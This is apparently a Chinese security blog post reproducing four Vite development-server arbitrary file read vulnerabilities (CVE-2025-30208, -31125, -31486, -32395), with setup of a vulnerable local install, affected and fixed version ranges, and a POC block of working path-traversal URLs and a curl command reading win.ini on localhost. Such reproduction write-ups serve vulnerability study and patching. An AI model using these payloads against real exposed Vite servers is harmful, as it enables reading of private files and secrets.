#  【漏洞复现】Vite 任意文件读取系列漏洞(附POC)   
原创 仇辉攻防  仇辉攻防   2025-04-13 07:46  
  
Vite是什么，和Next.js有什么区别？  
  
上一篇文章刚介绍了Next.js漏洞的复现：  
  
[【漏洞复现】Next.js中间件权限绕过漏洞 CVE-2025-29927](https://mp.weixin.qq.com/s?__biz=MzUyNTUyNTA5OQ==&mid=2247485165&idx=1&sn=6bf8e2894f9573d36bfc7203606b2150&scene=21#wechat_redirect)  
  
  
Vite 和 Next.js 是两个不同类型的前端工具，它们各自的用途、架构和适用场景有所不同。  
  
Vite 是什么？  
  
Vite 是一个现代前端构建工具，主要用于开发和打包前端项目（如 Vue、React 等）。它由 Vue 的作者 Evan You 开发，核心特点是快速启动、按需编译，并且基于 ES 模块（ESM）。  
  
Vite 的主要特点：  
1. 开发速度快：使用原生 ES 模块（ESM），避免了 Webpack 传统的打包后运行模式，大幅加快冷启动速度。  
  
1. 按需编译：只在代码变更时实时更新（HMR 热更新），而不是重新编译整个应用。  
  
1. 默认支持 Vue 和 React：内置支持 Vue、React、TypeScript 等，无需额外配置。  
  
1. 轻量 & 插件化：基于 Rollup 进行生产构建，可扩展性强。  
  
  
Vite 适用于构建前端 SPA（单页应用），并不包含服务端渲染（SSR）或全栈开发能力。  
  
如何使用Vite？  
```
https://cn.vite.dev/guide/
```  
  
漏洞环境搭建  
  
选择一个漏洞版本，使用如下命令安装（示例）  
  
#我的环境：windows+gitbash+npx  
```
npx create-vite@6.1.1 vulnerable-project
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7wWWNx9kFOjdYmnGMrEQRV2uYBBmbaicSQs6kZDDgq1lDHg5IkSo1aMQ/640?wx_fmt=png&from=appmsg "")  
  
安装完按照提示的命令进行  
```
 cd vulnerable-project
 npm install
 npm run dev
```  
  
安装完发现一个问题：版本不对，这是配置问题，如果不做固定，会默认安装更高版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7ZsqGGtyzwibgWu6ia32X4vUVXVHpHByB2dN6bxUggS6XQtN9QugDJ6yw/640?wx_fmt=png&from=appmsg "")  
  
如果没有发现版本问题，那么后续复现是出不来结果的    
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7lFuSmjTic9VET40N0gmWwWCqJvNFNYlcvIYaRsiaQzhiaqvXnVnIicbPRQ/640?wx_fmt=png&from=appmsg "")  
  
问题解决：在install命令之前通过修改package.json配置文件固定版本号  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7RJNV8DH6nfxRiabI1PibEKdGJIt256W36vvzyylOcicub7xD7RZqibZ09A/640?wx_fmt=png&from=appmsg "")  
  
删除前面的脱字符^即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7aSO0utlM6OtXhvJxp1RiaLibrMF40Ku2ZNQsiaQQCWKrvYTKBicG6jM5NA/640?wx_fmt=png&from=appmsg "")  
  
删掉整个文件夹重新来一遍（或者删掉lock文件，重新install，都行），版本处于漏洞版本，环境搭建成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o78qOwycxzjMgAVTJlDOiacVz61r5mmZgvyTsQ9s6AldPdy0KNdn4zuAQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
Vite任意文件读取漏洞，最近披露了多个CVE，如  CVE-2025-30208、CVE-2025-31125、CVE-2025-31486 和  CVE-2025-32395，从3月14日开始基本上是挖一个，修一个，再挖再修，主要涉及开发服务器在特定配置下的任意文件读取问题。  
> Vite 作为一个现代前端构建工具，因其快速开发体验和高效构建能力而广受欢迎，但近期披露的多个安全漏洞引发了社区的关注。 Vite 团队的快速响应和透明披露受到认可。未来，Vite 团队可能需要加强开发服务器的安全设计，减少类似漏洞的发生。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7w40icZ3iac7Nq19NZX5szYTk844tsKYGE5eGj9M6ywVSXPAFPP0kPaIw/640?wx_fmt=png&from=appmsg "")  
### POC  
  
由于我是windows环境，因此本文仅仅以windows环境做演示，以下POC仅适用windows  
```
#CVE-2025-30208
http://localhost:5173/@fs/C://windows/win.ini?import&raw??
#CVE-2025-31125
http://localhost:5173/@fs/C://windows/win.ini?import&inline=1.wasm?init
#CVE-2025-31486
http://localhost:5173/@fs/C:/Users/Lenovo/vitetest/vulnerable-project/?/../../../../../windows/win.ini?import&?raw
#CVE-2025-32395
curl --request-target /@fs/Users/Lenovo/vitetest/vulnerable-project/#/../../../../../windows/win.ini http://localhost:5173
```  
### CVE-2025-30208  
###   
### 影响版本：  
- 6.2.0 <= Vite <= 6.2.2  
  
- 6.1.0 <= Vite <= 6.1.1  
  
- 6.0.0 <= Vite <= 6.0.11  
  
- 5.0.0 <= Vite <= 5.4.14  
  
- Vite <= 4.5.9  
  
使用漏洞范围内的版本6.2.2复现结果：成功读取任意文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7PW1OEStJXGxialERdnan0IkOMPd4dR8vB3CBQibRN5pdM7xbKPWk4rmg/640?wx_fmt=png&from=appmsg "")  
  
6.2.3版本修复 CVE-2025-30208   
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7ibibjmq2icyolLia8T5vRNiadTkUMTwxuYLVnVuHacHCGoArrHHlEHnCKmg/640?wx_fmt=png&from=appmsg "")  
### CVE-2025-31125  
###   
### 影响版本：  
- 6.2.0 <= Vite <= 6.2.3  
  
- 6.1.0 <= Vite <= 6.1.2  
  
- 6.0.0 <= Vite <= 6.0.12  
  
- 5.0.0 <= Vite <= 5.4.15  
  
- Vite <= 4.5.10  
  
使用6.2.3版本：成功读取任意文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7RJ3Ap2J5zlaMytoRIMytoibqUgwzctUAWJm4c8yywChZKDxicw7o9cVQ/640?wx_fmt=png&from=appmsg "")  
  
6.2.4版本修复 CVE-2025-31125  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7zazicKuNIgBKib87lFbs5BQ5kTkYLiaKdlYJAic0EagAicrCqE4zlgKgn0g/640?wx_fmt=png&from=appmsg "")  
### CVE-2025-31486  
###   
### 影响版本：  
- 6.2.0 <= Vite <= 6.2.4  
  
- 6.1.0 <= Vite <= 6.1.3  
  
- 6.0.0 <= Vite <= 6.0.13  
  
- 5.0.0 <= Vite <= 5.4.16  
  
- Vite <= 4.5.11  
  
使用6.2.4版本：成功读取任意文件   
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7uRbJBLHJTFm2dMl9ZFeVicrQdiczPjL1FluB3CRTnIUf5LaPeAq3iapcA/640?wx_fmt=png&from=appmsg "")  
  
6.2.5版本修复 CVE-2025-31486  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7JDmcl9NnoJoHaejL2sjPrh0F7gjCSIMgrjHafFXicM8xzXQWeUVWIlw/640?wx_fmt=png&from=appmsg "")  
### CVE-2025-32395  
###   
### 影响版本：  
- 6.2.0 <= Vite <= 6.2.5  
  
- 6.1.0 <= Vite <= 6.1.4  
  
- 6.0.0 <= Vite <= 6.0.14  
  
- 5.0.0 <= Vite <= 5.4.17  
  
- Vite <= 4.5.12  
  
使用6.2.5版本：成功读取任意文件    
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7NUzFcWxF6JQgcVG7VoNYBFdcpiae3x2ETbuSa0cAgYXKJ4iaxU8G6lkQ/640?wx_fmt=png&from=appmsg "")  
  
6.2.6版本修复 CVE-2025-32395  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFLfpMVOE8Fnljiaw7OuUU5o7OMuckkicL7AOEm0TBiciaCTPEcSB7TdN7ibs2HialOpE8SC92srayGI2CAw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
